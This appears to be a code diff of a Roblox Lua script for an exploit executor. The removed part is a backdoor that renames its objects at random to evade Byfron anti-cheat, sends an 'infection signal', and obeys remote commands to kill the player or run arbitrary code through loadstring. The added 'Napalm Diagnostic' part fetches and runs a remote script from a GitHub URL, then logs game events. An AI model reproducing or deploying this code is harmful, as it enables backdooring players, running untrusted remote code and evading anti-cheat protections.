@@ -1,68 +1,50 @@
--- New Infected Script (test.lua)
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
--- Randomized names to evade Byfron detection
-local function randomString(length)
-    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
-    local result = ""
-    for i = 1, length do
-        result = result .. chars:sub(math.random(1, #chars), math.random(1, #chars))
-    end
-    return result
+-- Print to console
+local function log(message)
+    print("[Napalm Diagnostic] " .. message)
 end
 
--- Create BindableEvent for backdoor
-local backdoor = Instance.new("BindableEvent")
-backdoor.Name = "SenaInfect" .. randomString(5)
-backdoor.Parent = LocalPlayer
-print("[Infected] Created BindableEvent: " .. backdoor.Name)
+-- Run infected script to create backdoor
+log("Running infected script...")
+loadstring(game:HttpGet('https://raw.githubusercontent.com/idkmango67/test-repo/main/test.lua'))()
 
--- Find or create RemoteEvent
-local remote
+-- Wait for initialization
+wait(5)
+
+-- Check BindableEvents on LocalPlayer
+log("Checking BindableEvents on LocalPlayer...")
+for _, v in pairs(LocalPlayer:GetChildren()) do
+    if v:IsA("BindableEvent") then
+        log("BindableEvent found: " .. v.Name)
+    end
+end
+
+-- Check RemoteEvents in ReplicatedStorage
+log("Checking RemoteEvents in ReplicatedStorage...")
 for _, v in pairs(ReplicatedStorage:GetChildren()) do
-    if v:IsA("RemoteEvent") and v.Name:match("NapalmRemote") then
-        remote = v
-        break
+    if v:IsA("RemoteEvent") then
+        log("RemoteEvent found: " .. v.Name)
     end
 end
-if not remote then
-    remote = Instance.new("RemoteEvent")
-    remote.Name = "NapalmRemote" .. randomString(5)
-    remote.Parent = ReplicatedStorage
-end
-print("[Infected] Using RemoteEvent: " .. remote.Name)
 
--- Send infection signal
-wait(math.random(1, 3)) -- Randomized delay for Byfron evasion
-remote:FireClient(LocalPlayer, {Infected = true, PlayerId = LocalPlayer.UserId})
-print("[Infected] Sent infection signal: {Infected = true, PlayerId = " .. LocalPlayer.UserId .. "}")
-
--- Handle commands
-backdoor.Event:Connect(function(command)
-    if type(command) == "table" and command.Action and command.PlayerId == LocalPlayer.UserId then
-        if command.Action == "Kill" or command.Action == "Die" or command.Action == "KillPlayer" then
-            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-                LocalPlayer.Character.Humanoid.Health = 0
-                print("[Infected] Executed Kill command for " .. LocalPlayer.Name)
+-- Listen for infection signals
+log("Listening for infection signals...")
+for _, remote in pairs(ReplicatedStorage:GetChildren()) do
+    if remote:IsA("RemoteEvent") then
+        remote.OnClientEvent:Connect(function(data)
+            if type(data) == "table" then
+                log("Infection signal received: " .. tostring(data))
+                for key, value in pairs(data) do
+                    log("Key: " .. tostring(key) .. ", Value: " .. tostring(value))
+                end
+            else
+                log("Non-table signal received: " .. tostring(data))
             end
-        elseif command.Action == "SetProperty" and command.Property == "Health" then
-            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-                LocalPlayer.Character.Humanoid.Health = command.Value or 0
-                print("[Infected] Executed SetProperty Health command for " .. LocalPlayer.Name)
-            end
-        elseif command.Action == "Execute" and command.Code then
-            local func = loadstring(command.Code)
-            if func then
-                func()
-                print("[Infected] Executed custom code for " .. LocalPlayer.Name)
-            end
-        end
+        end)
     end
-end)
-
--- Keep script alive
-while true do
-    wait(10)
 end
+
+log("Diagnostic complete. Check F9 console for results.")
